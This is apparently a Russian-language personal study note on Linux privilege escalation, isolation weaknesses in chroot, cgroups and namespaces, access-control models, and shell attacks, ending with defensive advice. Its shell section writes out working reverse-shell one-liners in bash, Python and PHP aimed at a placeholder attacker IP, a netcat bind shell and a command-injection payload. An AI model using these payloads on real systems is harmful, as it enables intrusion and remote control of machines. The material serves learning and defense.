
#### Виды [[Модели контроля доступа|моделей контроля доступа]]

#### Подробное описание о [[Привилегии|привилегиях]]

#### Подробное описание о [[Процессы|процессах]]

#### Сайт бинарных файлов (программы) в Linux для эскалации привилегий или обхода ограничений [Gtfobins](https://gtfobins.github.io/)

---
# Привилегии

[[Привилегии|Привилегии]] есть везде в любой модели контроля доступа на них опираются процессы ....

- Уязвимость в избытке самих привилегий 777 
	Команда по поиску таких файлов `find / -perm -777 -type f`

- Уязвимость при использование спец битов таких как SUID GUID, которые позволяют запускать файл от привилегий владельца или группы
	`find / -perm -6000 -type f`

- Уязвимость при доступе к команде `sudo` /etc/sudores
	Команда выведет доступные команды от имени root `sudo -l` (нужен пароль от учётки)

### Не полная изоляция команд: `chroot` `cgroups` `namespaces`

#### `chroot`

`chroot` — это механизм, который изменяет корневой каталог для процесса и его потомков, создавая изолированную файловую систему. Однако `chroot` не обеспечивает полной изоляции на уровне ядра, и у него есть несколько уязвимостей:

1. **Доступ к системным вызовам**:
    - `chroot` не ограничивает доступ к системным вызовам. Процесс внутри `chroot` может использовать системные вызовы, такие как `ptrace`, `mount`, `chroot` (снова), `unshare`, и другие, которые могут позволить ему выйти из изоляции.
    - Пример атаки: процесс может использовать `ptrace` для подключения к другим процессам вне `chroot` и получить контроль над ними.

2. **Доступ к сетевым ресурсам**:
    - `chroot` не изолирует сетевые ресурсы. Процесс внутри `chroot` может открывать сокеты, подключаться к другим хостам, слушать порты и т.д.
    - Пример атаки: процесс может использовать сетевые вызовы для взаимодействия с внешними системами, что может привести к утечке данных или удаленному выполнению кода.

3. **Доступ к устройствам**:
    - `chroot` не ограничивает доступ к устройствам, таким как `/dev/mem`, `/dev/kmem`, `/dev/sdX`, и другим. Это может позволить процессу получить доступ к памяти ядра или физическим устройствам.
    - Пример атаки: процесс может прочитать или записать данные в память ядра, что может привести к повышению привилегий.

4. **Доступ к процессам вне `chroot`**:
    - Процесс внутри `chroot` может видеть и взаимодействовать с другими процессами на системе через `/proc` или `/sys`, если эти файловые системы не изолированы.
    - Пример атаки: процесс может убить или изменить другие процессы, что может привести к отказу в обслуживании (DoS).

5. **Возможность выхода из `chroot`**:
    - Если процесс внутри `chroot` имеет привилегии root, он может использовать уязвимости или специфические системные вызовы для выхода из `chroot` (например, через `chroot` снова или `pivot_root`).
    - Пример атаки: процесс может выйти из `chroot` и получить доступ ко всей файловой системе.

#### `Cgroups и Namespaces`

`cgroups` (control groups) и `namespaces` — это механизмы ядра Linux, которые обеспечивают более продвинутую изоляцию ресурсов и процессов по сравнению с `chroot`.

1. **Cgroups**:
    - Ограничивают использование ресурсов (CPU, память, диск, сеть) для группы процессов.
    - Позволяют контролировать, сколько ресурсов может использовать процесс или группа процессов.
    - Однако `cgroups` не изолируют процессы на уровне ядра полностью. Например, они не ограничивают доступ к системным вызовам или сетевым ресурсам напрямую.

2. **Namespaces**:
    - Обеспечивают изоляцию различных аспектов системы, таких как файловая система (`mount`), сеть (`net`), процессы (`pid`), пользователи (`user`), и другие.
    - Например, сетевое пространство имен (`net`) изолирует сетевые интерфейсы, что делает сетевую среду внутри пространства имен независимой от внешней системы.
    - Однако `namespaces` также не обеспечивают полной изоляции на уровне ядра. Например, процесс внутри пространства имен может использовать уязвимости ядра для выхода из изоляции.

#### Разбор уязвимостей при разных конфигурациях 

##### 1. **Чистый `chroot` (без `cgroups` и `namespaces`)**

Чистый `chroot` изолирует только файловую систему, но не ограничивает доступ к другим ресурсам системы. Основные уязвимости и возможные атаки:

- **Выход из `chroot`**:
    
    - Если процесс внутри `chroot` имеет привилегии root, он может использовать уязвимости или системные вызовы для выхода из `chroot`. Например:
        
        - Использование `chroot` снова с изменением корневого каталога.
        - Использование `pivot_root` для смены корневого каталога.
        - Использование `mount` для монтирования файловой системы хоста внутрь `chroot`.
    
    - Пример атаки: процесс может получить доступ к файловой системе хоста и модифицировать критичные файлы.

- **Доступ к устройствам**:
    
    - Процесс внутри `chroot` может получить доступ к устройствам, таким как `/dev/mem`, `/dev/kmem`, `/dev/sdX`, что позволяет ему читать или записывать данные в память ядра или на физические устройства.
    
    - Пример атаки: чтение или модификация памяти ядра для повышения привилегий.

- **Доступ к процессам вне `chroot`**:
    
    - Процесс может взаимодействовать с другими процессами через `/proc` или `/sys`, если эти файловые системы не изолированы.
    
    - Пример атаки: убийство или модификация других процессов, что может привести к отказу в обслуживании (DoS).

- **Сетевые атаки**:
    
    - `chroot` не изолирует сетевые ресурсы. Процесс может открывать сокеты, подключаться к другим хостам, слушать порты и т.д.
    
    - Пример атаки: утечка данных или удаленное выполнение кода через сетевые соединения.

- **Переполнение буфера**:
    
    - Если процесс внутри `chroot` имеет уязвимости (например, переполнение буфера), злоумышленник может использовать их для выполнения произвольного кода.
    
    - Пример атаки: эксплуатация уязвимостей в приложениях внутри `chroot` для повышения привилегий.

##### 2. **`chroot` + `cgroups`**

`cgroups` добавляет ограничения на использование ресурсов (CPU, память, диск, сеть), но не обеспечивает полной изоляции процессов.

- **Уязвимости**:
    
    - `cgroups` не ограничивают доступ к системным вызовам или сетевым ресурсам.
    
    - Процесс внутри `chroot` может использовать уязвимости ядра для обхода ограничений `cgroups`.
    
    - Пример атаки: использование уязвимостей ядра для повышения привилегий или выхода из изоляции.

- **Атаки на ресурсы**:
    
    - Если `cgroups` настроены неправильно, процесс может исчерпать выделенные ресурсы (например, память или CPU), что может привести к отказу в обслуживании (DoS) других процессов.


##### 3. **`chroot` + `namespaces`**

`namespaces` обеспечивают изоляцию различных аспектов системы, таких как файловая система, сеть, процессы, пользователи и другие.

- **Уязвимости**:
    
    - `namespaces` не обеспечивают полной изоляции на уровне ядра. Процесс внутри `chroot` может использовать уязвимости ядра для выхода из изоляции.
    
    - Пример атаки: использование уязвимостей ядра (например, `Dirty COW`) для повышения привилегий или выхода из `namespaces`.

- **Сетевые атаки**:
    
    - Если используется сетевое пространство имен (`net`), процесс изолирован от сетевых ресурсов хоста. Однако, если сетевое пространство имен не используется, процесс может взаимодействовать с сетью хоста.
    
    - Пример атаки: утечка данных или удаленное выполнение кода через сетевые соединения.

- **Доступ к устройствам**:
    
    - Если пространство имен для устройств (`device`) не используется, процесс может получить доступ к устройствам хоста.
    
    - Пример атаки: чтение или запись данных в память ядра через `/dev/mem`.

##### 4. **`chroot` + `namespaces` + `cgroups`**

Эта конфигурация обеспечивает более высокий уровень изоляции, но всё же не является полностью безопасной.

- **Уязвимости**:
    
    - Процесс внутри `chroot` может использовать уязвимости ядра для обхода ограничений `namespaces` и `cgroups`.
    
    - Пример атаки: использование уязвимостей ядра для повышения привилегий или выхода из изоляции.

- **Атаки на ресурсы**:
    
    - Если `cgroups` настроены неправильно, процесс может исчерпать выделенные ресурсы (например, память или CPU), что может привести к отказу в обслуживании (DoS) других процессов.

- **Сетевые атаки**:
    
    - Если используется сетевое пространство имен (`net`), процесс изолирован от сетевых ресурсов хоста. Однако, если сетевое пространство имен не используется, процесс может взаимодействовать с сетью хоста.
    
    - Пример атаки: утечка данных или удаленное выполнение кода через сетевые соединения.

- **Доступ к устройствам**:
    
    - Если пространство имен для устройств (`device`) не используется, процесс может получить доступ к устройствам хоста.
    
    - Пример атаки: чтение или запись данных в память ядра через `/dev/mem`.

##### Основные атаки для всех конфигураций

1. **Переполнение буфера**:
    
    - Если процесс внутри `chroot` имеет уязвимости (например, переполнение буфера), злоумышленник может использовать их для выполнения произвольного кода.
    
    - Пример атаки: эксплуатация уязвимостей в приложениях внутри `chroot` для повышения привилегий.

2. **Уязвимости ядра**:
    
    - Процесс может использовать уязвимости ядра (например, `Dirty COW`, `CVE-2021-4034`) для повышения привилегий или выхода из изоляции.

3. **Атаки на ресурсы**:
    
    - Процесс может исчерпать выделенные ресурсы (например, память или CPU), что может привести к отказу в обслуживании (DoS) других процессов.

4. **Сетевые атаки**:
    
    - Если сетевое пространство имен не используется, процесс может взаимодействовать с сетью хоста, что может привести к утечке данных или удаленному выполнению кода.

5. **Доступ к устройствам**:
    
    - Процесс может получить доступ к устройствам хоста, что может привести к чтению или записи данных в память ядра или на физические устройства.

----
# Модели контроля доступа с механизмами

## При модели контроля доступа DAC

1. При данной модели привилегиями распоряжаются сами пользователи и могут быть такие уязвимости как:

	- Запуск файла от root (используется спец бит **(4)SETUID - от пользователя (2)SGID - от группы**) 
		`find / -perm -6000 -type f -exec ls -ld {} \; 2>/dev/null` - 6 это и от пользователей и от групп искать
	
	- Изменение конфигурационного файла `/etc/sudoers` который позволяет от имени root исполнять команды. Возможно просмотреть `sudo -l` сайт **GTFOBins** хранит в себе список двоичных файлов Unix.
		`find / -perm -4000 2>/dev/null `
	
	- Избыток прав в файлах или директорий `777` 
		`find / -perm -777 -type f -exec ls -ld {} \; 2>/dev/null` - или `-type d`
	
	- Запуск процессов имеющие избыточные привилегии

## При ACL

1. [[ACL (Access Control Lists)|ACL]] даёт более гибкие права доступа, чем традиционные Unix-права. 

- Остаются те же проблемы что и при DAC

- Неправильная настройка ACL, которая может привести к избыточным правам доступа для пользователей или групп.
	`find /path/to/dir -type f -exec getfacl {} + | grep "user:<username>:rwx"`

## При SELinux

1. [[SELinux|SELinux]] использует как мандатную модель контроля доступа так и ролевую. 

- Уязвимость в политике безопасности

- Используется режим *Permissive* который только логирует 
	Определить режим `sestatus`

- Избыточность в ролях которая позволяет получать доступ к тем объектам которые не нужны
	Проверка текущих ролей и контекстов: `id -Z`

## При AppArmor

1. [[AppArmor|AppArmor]] работает на основе профилей, которые определяют, какие ресурсы может использовать конкретное приложение.

- Использование режима *Complain*, который не блокирует действия, а только логирует их.
	Проверка статуса AppArmor: `aa-status` `aa-status | grep "complain"`

- Отсутствие профиля для критически важных приложений.

- Неправильная настройка профилей, которая может позволить приложению доступ к нежелательным ресурсам.

----
# Ядро системы

Так как ядро системы это как человеческое сердце отвечающее за главные механизмы то уязвимости могут быть в том чем оперирует ядро:
- [[Процессы|процессы]]
- ресурсы
 Ядро управляет ресурсами компьютера и обеспечивает их эффективное использование.

## Уязвимости процессов

Процессы могут быть уязвимы к различным атакам и ошибкам.

#### 1. Переполнение буфера (Buffer Overflow)
- **Описание**: Если процесс неправильно обрабатывает ввод данных, злоумышленник может переполнить буфер и внедрить вредоносный код.
- **Пример**: Атака на веб-сервер через неправильно обработанный HTTP-запрос.
#### 2. Утечка памяти (Memory Leak)
- **Описание**: Если процесс не освобождает выделенную память, это может привести к исчерпанию ресурсов системы.
- **Пример**: Долго работающий процесс, который постепенно "съедает" всю оперативную память.
#### 3. Race Conditions (Состояние гонки)
- **Описание**: Если два процесса пытаются одновременно изменить общий ресурс, это может привести к непредсказуемым результатам.
- **Пример**: Атака TOCTOU (Time of Check to Time of Use), когда злоумышленник изменяет файл между проверкой и использованием.
#### 4. Неправильное использование привилегий
- **Описание**: Если процесс имеет избыточные привилегии (например, запущен от имени root), это может быть использовано для повышения прав.
- **Пример**: Процесс с capability `CAP_DAC_OVERRIDE` может получить доступ к защищенным файлам.
#### 5. Уязвимости в сторонних библиотеках
- **Описание**: Если процесс использует уязвимые библиотеки, это может привести к компрометации процесса.
- **Пример**: Уязвимость в библиотеке OpenSSL (например, Heartbleed).
#### 6. Небезопасное использование системных вызовов
- **Описание**: Если процесс неправильно использует системные вызовы (например, `exec()`, `fork()`), это может привести к уязвимостям.
- **Пример**: Неправильная обработка дочерних процессов может привести к утечке данных.
#### 7. Уязвимости в конфигурации
- **Описание**: Если процесс запущен с неправильными параметрами или конфигурацией, это может сделать его уязвимым.
- **Пример**: Веб-сервер, который отдает доступ к системным файлам из-за неправильной настройки.

#### Команды для проверки уязвимостей ядра:

- Проверка версии ядра:
    `uname -r`
    
- Использование инструментов для сканирования уязвимостей (например, `lynis`):
    `lynis audit system`

----
# Загрузка пакетов

## [[Управление пакетами|.deb пакеты]] 

Используются на дистрибутивах от дебиан и могут быть чем угодно от ПО до драйвера.

### Возможные уязвимости

1. **Небезопасные скрипты**:
    - Скрипты установки (`postinst`, `preinst`) могут содержать команды, которые выполняются с привилегиями root. Если в них есть уязвимости (например, использование непроверенных данных), это может привести к повышению привилегий.

2. **Небезопасные зависимости**:
    - Пакет может зависеть от устаревших или уязвимых библиотек, что может быть использовано для эксплуатации.

3. **Конфигурационные файлы с избыточными правами**:
    - Если конфигурационные файлы имеют слишком широкие права доступа (например, `chmod 777`), это может позволить злоумышленнику изменить их.

4. **Загрузка внешних ресурсов**:
    - Если скрипты пакета загружают файлы из интернета (например, через `curl` или `wget`), это может быть использовано для внедрения вредоносного кода.

5. **Небезопасные переменные окружения**:
    - Если скрипты используют переменные окружения без должной проверки, это может привести к уязвимостям, таким как инъекция команд.

----

# Shell

Шелл (shell) — это интерфейс взаимодействия между пользователем и ядром операционной системы. Он позволяет выполнять команды, управлять файлами, запускать программы и взаимодействовать с ОС. Сам по себе шелл не опасен, но он является мощным инструментом, который может быть использован злоумышленниками для выполнения вредоносных действий.

## Уязвимости, связанные с шеллом

Шелл может стать источником уязвимостей, если злоумышленник получает к нему доступ. Вот основные атаки, связанные с шеллом:

### 1. **Получение шелла**

**Получение шелла** — это процесс, при котором злоумышленник получает доступ к командной оболочке на целевой системе. Это может быть:

- **Локальный шелл**: Если злоумышленник уже имеет доступ к системе (например, через SSH или физический доступ).

- **Удаленный шелл**: Если злоумышленник получает доступ к шеллу через сеть, эксплуатируя уязвимости в сервисах.

**Пример атаки**:

- Злоумышленник находит уязвимость в веб-приложении, которая позволяет выполнить произвольный код (например, через инъекцию команд). Он использует эту уязвимость для запуска шелла:
	`/bin/bash`
    
    Теперь злоумышленник может выполнять команды от имени пользователя, под которым работает уязвимое приложение.

### 2. **Реверс-шелл (Reverse Shell)**

**Реверс-шелл** — это тип удаленного шелла, при котором целевая система (жертва) сама устанавливает соединение с атакующим. Это полезно, если прямое соединение с целевой системой невозможно (например, из-за брандмауэров или NAT).

#### Как работает реверс-шелл?

1. Атакующий запускает слушатель (listener) на своей машине, который ожидает входящих соединений.

2. На целевой системе выполняется команда или эксплуатируется уязвимость, которая устанавливает соединение с атакующим.

3. Как только соединение установлено, атакующий получает доступ к шеллу на целевой системе.


**Пример реверс-шелла**:

1. Атакующий запускает слушатель на своей машине (например, с помощью `netcat`):
    `nc -lvp 4444`
    
    Здесь:
    - `-l` — режим слушателя.
    - `-v` — verbose (подробный вывод).
    - `-p 4444` — порт, на котором слушает атакующий.
    
2. На целевой системе выполняется команда, которая устанавливает соединение с атакующим:
    `bash -c 'bash -i >& /dev/tcp/атакующий_IP/4444 0>&1'`
    
    Здесь:    
    - `bash -i` — запуск интерактивного шелла.
    - `>& /dev/tcp/атакующий_IP/4444` — перенаправление ввода/вывода на сокет TCP.
    - `0>&1` — перенаправление стандартного ввода в стандартный вывод.

3. Как только соединение установлено, атакующий получает интерактивный шелл на целевой системе.


**Другие примеры реверс-шеллов**:

- С использованием Python:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("атакующий_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

- С использованием PHP:    
```
php -r '$sock=fsockopen("атакующий_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```


### 3. **Бинд-шелл (Bind Shell)**

**Бинд-шелл** — это тип удаленного шелла, при котором на целевой системе открывается порт, к которому подключается атакующий. В отличие от реверс-шелла, здесь атакующий инициирует соединение с целевой системой.

#### Как работает бинд-шелл?

1. На целевой системе выполняется команда, которая открывает порт и привязывает к нему шелл.

2. Атакующий подключается к этому порту и получает доступ к шеллу.


**Пример бинд-шелла**:

1. На целевой системе выполняется команда:
    `nc -lvp 4444 -e /bin/bash`
    
    Здесь:
    - `-e /bin/bash` — привязка шелла к порту.

2. Атакующий подключается к целевой системе:
    `nc целевая_система_IP 4444`
    
    Теперь атакующий получает интерактивный шелл на целевой системе.


**Преимущества бинд-шелла**:
- Простота настройки.
- Полезен, если атакующий может напрямую подключиться к целевой системе.


**Недостатки бинд-шелла**:
- Легко обнаруживается сетевыми сканерами.
- Может быть заблокирован брандмауэром.

### 4. **Атаки через инъекцию команд**

Шелл может быть использован для выполнения атак через инъекцию команд, если злоумышленник может внедрить произвольные команды в уязвимое приложение.

**Пример**:

- Уязвимое веб-приложение принимает входные данные от пользователя и передает их в системную команду:
    `ping -c 4 пользовательский_ввод`
    
- Злоумышленник вводит:
    `пользовательский_ввод; /bin/bash`
    
- В результате выполняется команда:
    `ping -c 4 ; /bin/bash`
    Это приводит к запуску шелла.

### 5. **Атаки через подмену переменных окружения**

Если шелл использует переменные окружения (например, `PATH`), злоумышленник может подменить их для выполнения вредоносного кода.

**Пример**:

- Злоумышленник создает вредоносный файл с именем `ls` и добавляет его в каталог, указанный в `PATH`.

- Когда пользователь выполняет команду `ls`, вместо стандартной утилиты выполняется вредоносный код.

## Защита от атак, связанных с шеллом

1. **Ограничение прав доступа**:
    - Убедитесь, что только доверенные пользователи имеют доступ к шеллу.
    - Используйте минимальные привилегии для запуска программ.

2. **Использование брандмауэров**:
    - Ограничьте входящие и исходящие соединения.
    - Блокируйте подозрительные IP-адреса.

3. **Регулярное обновление ПО**:
    - Устанавливайте обновления безопасности для устранения уязвимостей.

4. **Мониторинг сетевой активности**:
    - Используйте инструменты вроде `Wireshark` или `tcpdump` для обнаружения подозрительных соединений.

5. **Аудит кода**:
    - Проверяйте код на наличие уязвимостей, таких как инъекции команд.